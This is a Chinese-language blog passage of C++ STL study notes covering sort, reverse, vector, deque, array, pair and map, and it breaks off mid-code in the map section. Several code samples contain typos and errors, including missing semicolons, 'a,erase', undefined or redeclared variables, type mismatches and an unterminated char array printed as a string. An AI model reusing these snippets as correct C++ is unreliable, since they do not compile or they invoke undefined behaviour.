    <content type="html"><![CDATA[<h1 id="STL"><a href="#STL" class="headerlink" title="STL"></a>STL</h1><p>参考链接：</p><p><a href="http://c.biancheng.net/stl/">http://c.biancheng.net/stl/</a></p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>STL，英文全称 standard template library，中文可译为标准模板库或者泛型库，其包含有大量的模板类和模板函数，是 C++ 提供的一个基础模板的集合，用于完成诸如输入&#x2F;输出、数学计算等功能。</p><p>STL 最初由惠普实验室开发，于 1998 年被定为国际标准，正式成为 C++ 程序库的重要组成部分。值得一提的是，如今 STL 已完全被内置到支持 C++ 的编译器中，无需额外安装，这可能也是 STL 被广泛使用的原因之一。</p><p>STL 就位于各个 C++ 的头文件中，即它并非以二进制代码的形式提供，而是以源代码的形式提供。</p><p>从根本上说，STL 是一些容器、算法和其他一些组件的集合，所有容器和算法都是总结了几十年来算法和数据结构的研究成果，汇集了许多计算机专家学者经验的基础上实现的，因此可以说，STL 基本上达到了各种存储方法和相关算法的高度优化。</p><p><strong>注意，这里提到的容器，本质上就是封装有数据结构的模板类，例如 list、vector、set、map 等</strong></p><p>STL的头文件：algorithm，numeric，vector，deque，list，queue，stack，set，map，iterator，memory，utility</p><h2 id="1-Algorithm"><a href="#1-Algorithm" class="headerlink" title="1. Algorithm"></a>1. Algorithm</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span>  <span class="comment">// 使用Algorithm必须包含的头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">//排序</span></span><br><span class="line">  <span class="type">int</span> a[<span class="number">5</span>] = &#123;<span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>,<span class="number">7</span>&#125;;</span><br><span class="line">  <span class="built_in">sort</span> (a, a+<span class="number">5</span>); </span><br><span class="line">  <span class="comment">// stable_sort (a, a+5);</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    cout &lt;&lt; a[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">  cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 反转</span></span><br><span class="line">  <span class="built_in">reverse</span>(a, a+<span class="number">5</span>);  </span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    cout &lt;&lt; a[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">  cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 绝对值</span></span><br><span class="line">  cout &lt;&lt; <span class="built_in">abs</span>(<span class="number">-5</span>) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 最大值最小值</span></span><br><span class="line">  cout &lt;&lt; <span class="built_in">max</span>(<span class="number">5</span>, <span class="number">3</span>) &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; <span class="built_in">min</span>(<span class="number">5</span>, <span class="number">3</span>) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 交换</span></span><br><span class="line">  <span class="type">int</span> x = <span class="number">1</span>, y = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">swap</span> (x, y);</span><br><span class="line">  cout &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; y &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 赋值函数fill</span></span><br><span class="line">  <span class="type">int</span> b[<span class="number">4</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">  <span class="built_in">fill</span> (b, b+<span class="number">4</span>, <span class="number">-1</span>);   <span class="comment">//前4个元素全赋值为-1</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i ++)</span><br><span class="line">    cout &lt;&lt; b[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">  cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//求全排列的下一个顺序, next_permutation若有下一个全排列返回true没有则返回false</span></span><br><span class="line">  <span class="type">char</span> str[<span class="number">3</span>] = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    cout &lt;&lt; str &lt;&lt; endl;</span><br><span class="line">  &#125;<span class="keyword">while</span> (<span class="built_in">next_permutation</span>(str, str+<span class="number">3</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-Container"><a href="#2-Container" class="headerlink" title="2. Container"></a>2. Container</h2><h3 id="2-1-序列容器"><a href="#2-1-序列容器" class="headerlink" title="2.1 序列容器"></a><strong>2.1 序列容器</strong></h3><p>主要包括 vector 向量容器、list 列表容器以及 deque 双端队列容器。之所以被称为序列容器，是因为元素在容器中的位置同元素的值无关，即<strong>序列容器不是排序的</strong>。将元素插入容器时，指定在什么位置，元素就会位于什么位置。</p><h4 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h4><p>vector相比数组的好处是可以根据存储数据的数量自动变长，并且有很多方法可以直接调用。</p><p>vector容器<strong>在尾部增加或删除元素的效率最高</strong>（时间复杂度为 O(1) 常数阶），在其它位置插入或删除元素效率较差（时间复杂度为 O(n) 线性阶，其中 n 为容器中元素的个数）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// -----------------------初始化-----------------------</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; a; <span class="comment">//定义容器a，当前a长度为0，但和普通数组不同的是，此a可以根据存储数据的数量自动变长。</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; b &#123;&#125;;   <span class="comment">//指定为空</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">c</span><span class="params">(<span class="number">20</span>)</span></span>;  <span class="comment">//指定有20个元素，且全为0</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">d</span><span class="params">(<span class="number">20</span>, <span class="number">-1</span>)</span></span>;  <span class="comment">//指定有20个元素，且全为-1，这里可以使用变量进行初始化</span></span><br><span class="line">    <span class="comment">// 使用其他数据结构初始化</span></span><br><span class="line">    <span class="type">int</span> array[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; <span class="built_in">value</span>(array,array+<span class="number">3</span>);  <span class="comment">// 使用数组初始化vector</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; value1&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">value2</span><span class="params">(value1.begin(),value1.begin()+<span class="number">3</span>)</span></span>;   <span class="comment">// 使用vector初始化vector</span></span><br><span class="line">    value2.<span class="built_in">assign</span>(value1.<span class="built_in">begin</span>(),value1.<span class="built_in">begin</span>()+<span class="number">3</span>);    <span class="comment">//使用assign方法初始化</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// -----------------------手动调整大小-----------------------</span></span><br><span class="line">    a.<span class="built_in">resize</span>(<span class="number">100</span>);  <span class="comment">// 默认初始化为0</span></span><br><span class="line">    a.<span class="built_in">resize</span>(<span class="number">20</span>, <span class="number">-1</span>) <span class="comment">//重新调整 a 的大小为 20，并存储 20 个 -1 元素。</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 赋值</span></span><br><span class="line">    a[<span class="number">9</span>] = <span class="number">100</span>;</span><br><span class="line">    <span class="comment">// -----------------------添加元素-----------------------</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span> ; i++)&#123;  <span class="comment">//向a中添加10个元素</span></span><br><span class="line">        a.<span class="built_in">emplace_back</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    a.<span class="built_in">insert</span>(a.<span class="built_in">begin</span>(), <span class="number">100</span>， <span class="number">2</span>);  <span class="comment">//向指定位置的前面添加元素，2个100</span></span><br><span class="line">    a.<span class="built_in">emplace</span>(a.<span class="built_in">begin</span>(), <span class="number">100</span>);   <span class="comment">//emplace每次只能插入一个元素，但是emplace的效率更高</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// -----------------------访问元素-----------------------</span></span><br><span class="line">    cout&lt;&lt;a[<span class="number">0</span>]&lt;&lt;endl;  <span class="comment">// 访问单个元素，直接使用下标，可能越界</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;首个元素为：&quot;</span> &lt;&lt; a.<span class="built_in">at</span>(<span class="number">0</span>) &lt;&lt; endl;   <span class="comment">// 使用at方法访问,会进行越界判断</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;values 首元素为：&quot;</span> &lt;&lt; values.<span class="built_in">front</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;values 尾元素为：&quot;</span> &lt;&lt; values.<span class="built_in">back</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> i = a.<span class="built_in">begin</span>(); i &lt; a.<span class="built_in">end</span>(); i++) &#123;  <span class="comment">//使用迭代器遍历容器</span></span><br><span class="line">        cout &lt;&lt; *i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// -----------------------删除-----------------------</span></span><br><span class="line">    a.<span class="built_in">pop_back</span>();   <span class="comment">// 删除最后一个元素，size会减小，但capacity不会变</span></span><br><span class="line">    a,<span class="built_in">erase</span>(a.<span class="built_in">begin</span>(), a,begin+<span class="number">3</span>);  <span class="comment">// 删除指定位置的元素，并返回指向被删除元素下一个位置元素的迭代器，size会减小，但capacity不会变</span></span><br><span class="line">    <span class="keyword">auto</span> it = <span class="built_in">remove</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>(), <span class="number">3</span>);;  <span class="comment">// 删除等于指定值的元素，并返回指向被删除元素下一个位置元素的迭代器，，size和capacity都不会变</span></span><br><span class="line">    a.<span class="built_in">clear</span>();  <span class="comment">// 清空，size变为0，capacity不会变</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// -----------------------交换元素-----------------------</span></span><br><span class="line"><span class="comment">// 注意，swap() 函数在头文件 &lt;algorithm&gt; 和 &lt;utility&gt; 中都有定义，使用时引入其中一个即可。</span></span><br><span class="line"><span class="built_in">swap</span>(*(a.<span class="built_in">begin</span>()+<span class="number">1</span>),*(a.<span class="built_in">end</span>()<span class="number">-1</span>));     <span class="comment">//等同于 swap(a[1],a[4])</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><u>注意，vector 容器在使用resize()申请更多内存的同时，容器中的所有元素可能会被复制或移动到新的内存地址，这会导致之前创建的迭代器失效。</u>因此，为了保险起见，每当 vector 容器的容量发生变化时，我们都要对之前创建的迭代器重新初始化一遍：</p><p><u>注意，不要使用vector&lt;bool&gt;，该类型使用bit进行存储，会有很多问题</u></p><p> <strong>array、vector 和 deque 容器的函数成员:</strong></p><table><thead><tr><th>函数成员</th><th>函数功能</th><th>array</th><th>vector</th><th>deque</th></tr></thead><tbody><tr><td>begin()</td><td>返回指向容器中第一个元素的迭代器。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>end()</td><td>返回指向容器最后一个元素所在位置后一个位置的迭代器，通常和 begin() 结合使用。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>rbegin()</td><td>返回指向最后一个元素的迭代器。且++是向左移动</td><td>是</td><td>是</td><td>是</td></tr><tr><td>rend()</td><td>返回指向第一个元素所在位置前一个位置的迭代器。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>assign()</td><td>用新元素替换原有内容。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>size()</td><td>返回实际元素个数。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>empty()</td><td>判断容器中是否有元素，若无元素，则返回 true；反之，返回 false。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>at()</td><td>使用经过边界检查的索引访问元素。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>resize()</td><td>改变实际元素的个数。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>front()</td><td>返回第一个元素的引用。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>back()</td><td>返回最后一个元素的引用。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>operator[]</td><td>使用索引访问元素。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>push_back()</td><td>在序列的尾部添加一个元素。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>insert()</td><td>在指定的位置插入一个或多个元素。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>emplace_back()</td><td>在序列尾部生成一个元素。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>pop_back()</td><td>移出序列尾部的元素。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>erase()</td><td>移出一个元素或一段元素。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>clear()</td><td>移出所有的元素，容器大小变为 0。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>swap()</td><td>交换两个容器的所有元素。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>data()</td><td>返回指向容器中第一个元素的指针。</td><td>是</td><td>是</td><td>-</td></tr></tbody></table><h4 id="list"><a href="#list" class="headerlink" title="list"></a>list</h4><p>list容器以<strong>双向链表</strong>的形式组织元素，在这个序列的<strong>任何地方都可以高效地增加或删除元素</strong>（时间复杂度都为常数阶 O(1)），但访问容器中任意元素的<strong>速度要比前三种容器慢</strong>，这是因为 list&lt;T&gt; 必须从第一个元素或最后一个元素开始访问，需要沿着链表移动，直到到达想要的元素。</p><p>另外还有一个forward_list&lt;T&gt;（正向链表容器），和 list 容器非常类似，只不过它以单链表的形式组织元素，它内部的元素只能从第一个元素开始访问，是一类比链表容器快、更节省内存的容器。</p><h4 id="deque"><a href="#deque" class="headerlink" title="deque"></a>deque</h4><p>deque容器不仅尾部插入和删除元素高效，在头部插入或删除元素也同样高效，时间复杂度都是 O(1) 常数阶，但是在容器中某一位置处插入或删除元素，时间复杂度为 O(n) 线性阶；</p><p>相比vector，deque可以更方便的在头部增删元素。</p><p><strong>deque容器提供的成员函数：</strong>其余未展示的函数基本与vector相同</p><table><thead><tr><th>函数成员</th><th>函数功能</th></tr></thead><tbody><tr><td>push_back()</td><td>在序列的尾部添加一个元素。</td></tr><tr><td>push_front()</td><td>在序列的头部添加一个元素。</td></tr><tr><td>emplace_front()</td><td>在容器头部生成一个元素。和 push_front() 的区别是，该函数直接在容器头部构造元素，省去了复制移动元素的过程。</td></tr><tr><td>emplace_back()</td><td>在容器尾部生成一个元素。和 push_back() 的区别是，该函数直接在容器尾部构造元素，省去了复制移动元素的过程。</td></tr><tr><td>pop_back()</td><td>移除容器尾部的元素。</td></tr><tr><td>pop_front()</td><td>移除容器头部的元素。</td></tr></tbody></table><h4 id="array"><a href="#array" class="headerlink" title="array"></a>array</h4><p>array&lt;T,N&gt;（数组容器）：表示可以存储 N 个 T 类型的元素，是 C++ 本身提供的一种容器。此类容器一旦建立，其<strong>长度就是固定不变的</strong>，这意味着不能增加或删除元素，只能改变某个元素的值；</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;array&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    std::array&lt;<span class="type">double</span>, 10&gt; v;  <span class="comment">// 名为v的有10个double类型的元素的array</span></span><br><span class="line">    std::array&lt;<span class="type">double</span>, 10&gt; v &#123;&#125;;   <span class="comment">// 初始化全为0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><u>除此之外，stack&lt;T&gt; 和 queue&lt;T&gt; 本质上也属于序列容器，只不过它们都是在 deque 容器的基础上改头换面而成，通常更习惯称它们为容器适配器</u></p><h3 id="2-2-排序容器"><a href="#2-2-排序容器" class="headerlink" title="2.2 排序容器"></a>2.2 排序容器</h3><p>包括 set 集合容器、multiset多重集合容器、map映射容器以及 multimap 多重映射容器。排序容器中的元素默认是由小到大排序好的，即便是插入元素，元素也会插入到适当位置。所以关联容器在查找时具有非常好的性能。multimap、multiset与map、set的唯一不同在于其键可以重复。</p><p>STL中可以使用 pair 类模板来创建“键值对”形式的元素。pair类模板还提供有一个 swap() 成员函数，能够互换 2 个 pair 对象的键值对，其操作成功的前提是这 2 个 pair 对象的键和值的类型要相同。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;utility&gt;</span>      <span class="comment">// pair 类模板定义在&lt;utility&gt;头文件中</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 调用默认构造函数</span></span><br><span class="line">    pair&lt;string, string&gt; pair1;</span><br><span class="line">    pair1.first = <span class="string">&quot;animal&quot;</span>;</span><br><span class="line">    pair1.second = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">    <span class="comment">// 直接使用 2 个元素初始化 pair 对象</span></span><br><span class="line">    <span class="function">pair&lt;string, string&gt; <span class="title">pair2</span><span class="params">(<span class="string">&quot;animal&quot;</span>,<span class="string">&quot;cat&quot;</span>)</span></span>;</span><br><span class="line">    pair&lt;string, string&gt; pair2 = &#123;<span class="string">&quot;animal&quot;</span>,<span class="string">&quot;cat&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">// 使用pair初始化pair</span></span><br><span class="line">    <span class="function">pair&lt;string, string&gt; <span class="title">pair3</span><span class="params">(pair2)</span></span>;</span><br><span class="line">    <span class="comment">// 调用移动构造函数</span></span><br><span class="line">    <span class="function">pair&lt;string, string&gt; <span class="title">pair4</span><span class="params">(make_pair(<span class="string">&quot;animal&quot;</span>, <span class="string">&quot;cat&quot;</span>))</span></span>;</span><br><span class="line">pair&lt;string, string&gt; pair4 = <span class="built_in">make_pair</span>(<span class="string">&quot;animal&quot;</span>, <span class="string">&quot;cat&quot;</span>);</span><br><span class="line">    <span class="comment">// 输出</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;pair1: &quot;</span> &lt;&lt; pair1.first &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; pair1.second &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 交换键值对</span></span><br><span class="line">    pair1.<span class="built_in">swap</span>(pair2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="map"><a href="#map" class="headerlink" title="map"></a>map</h4><p>定义在 &lt;map&gt; 头文件中，使用该容器存储的数据，其各个元素的键必须是唯一的（即不能重复），该容器会根据各元素键的大小，默认进行升序排序。</p><p><u>注意，使用insert函数插入元素val时</u>，val 参数表示键值对变量，同时该方法会返回一个 pair 对象，其中 pair.first 表示一个迭代器，pair.second 为一个 bool 类型变量：</p><ul><li>如果成功插入 val，则该迭代器指向新插入的 val，bool 值为 true；</li><li>如果插入 val 失败，则表明当前 map 容器中存有和 val 的键相同的键值对（用 p 表示），此时返回的迭代器指向 p，bool 值为 false</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span>   <span class="comment">//使用 map 容器，必须引入该头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;utility&gt;</span>  <span class="comment">// 使用pair</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// -------------------------初始化-------------------------</span></span><br><span class="line">    <span class="comment">//创建一个空的 map 关联式容器，该容器中存储的键值对，其中键为 string 字符串，值也为 string 字符串类型</span></span><br><span class="line">    map&lt;string, string&gt; mymap;</span><br><span class="line">    <span class="comment">//向 mymap 容器中添加数据</span></span><br><span class="line">    mymap[<span class="string">&quot;animal&quot;</span>] = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">    mymap[<span class="string">&quot;plant&quot;</span>] = <span class="string">&quot;flower&quot;</span>;</span><br><span class="line">    mymap[<span class="string">&quot;planet&quot;</span>] = <span class="string">&quot;earth&quot;</span>;</span><br><span class="line">    <span class="comment">// 定义的同时初始化</span></span><br><span class="line">    map&lt;string, <span class="type">int</span>&gt; myMap&#123; &#123;<span class="string">&quot;animal&quot;</span>,<span class="number">10</span>&#125;,&#123;<span class="string">&quot;plant&quot;</span>,<span class="number">20</span>&#125; &#125;;</span><br><span class="line">    map&lt;string, <span class="type">int</span>&gt; myMap&#123; <span class="built_in">make_pair</span>(<span class="string">&quot;animal&quot;</span>,<span class="number">10</span>), <span class="built_in">make_pair</span>(<span class="string">&quot;plant&quot;</span>,<span class="number">20</span>) &#125;;</span><br><span class="line">    <span class="function">map&lt;string, <span class="type">int</span>&gt; <span class="title">newMap</span><span class="params">(myMap)</span></span></span><br><span class="line"><span class="function">    <span class="comment">// map默认使用升序排序初始化，所以下面两行代码等价</span></span></span><br><span class="line"><span class="function">    map&lt;string, <span class="type">int</span>, less&lt;string&gt;&gt; myMap</span>&#123; &#123;<span class="string">&quot;C语言教程&quot;</span>,<span class="number">10</span>&#125;,&#123;<span class="string">&quot;STL教程&quot;</span>,<span class="number">20</span>&#125; &#125;;</span><br><span class="line">    map&lt;string, <span class="type">int</span> &gt;myMap&#123; &#123;<span class="string">&quot;C语言教程&quot;</span>,<span class="number">10</span>&#125;,&#123;<span class="string">&quot;STL教程&quot;</span>,<span class="number">20</span>&#125; &#125;;</span><br><span class="line">    <span class="comment">// map使用降序排序初始化</span></span><br><span class="line">    map&lt;string, <span class="type">int</span>, greater&lt;string&gt;&gt;myMap&#123; &#123;<span class="string">&quot;C语言教程&quot;</span>,<span class="number">10</span>&#125;,&#123;<span class="string">&quot;STL教程&quot;</span>,<span class="number">20</span>&#125; &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// -------------------------添加键值对-------------------------</span></span><br><span class="line">    myMap.<span class="built_in">emplace</span>(<span class="string">&quot;planet&quot;</span>,<span class="string">&quot;earth&quot;</span>);</span><br><span class="line">    <span class="function">pair&lt;string, string&gt; <span class="title">a</span><span class="params">(<span class="string">&quot;planet&quot;</span>,<span class="string">&quot;earth&quot;</span>)</span></span>;</span><br><span class="line">    myMap.<span class="built_in">insert</span>(a);   <span class="comment">// 因为map会自动根据键进行排序，所以插入时没有必要指定插入位置</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// -------------------------遍历和索引-------------------------</span></span><br><span class="line">    <span class="comment">//使用 map 容器的迭代器，遍历 mymap 容器，并输出其中存储的各个键值对</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> it = mymap.<span class="built_in">begin</span>(); it != mymap.<span class="built_in">end</span>(); ++it) &#123;</span><br><span class="line">        <span class="comment">//输出各个元素中的键和值</span></span><br><span class="line">        cout &lt;&lt; it-&gt;first &lt;&lt; <span class="string">&quot; =&gt; &quot;</span> &lt;&lt; it-&gt;second &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    string a = mymap[<span class="string">&quot;animal&quot;</span>];</span><br><span class="line">    string a = myMap.<span class="built_in">at</span>(<span class="string">&quot;animal&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// -------------------------查找-------------------------</span></span><br><span class="line">    <span class="keyword">auto</span> iter = myMap.<span class="built_in">find</span>(<span class="string">&quot;animal&quot;</span>);   <span 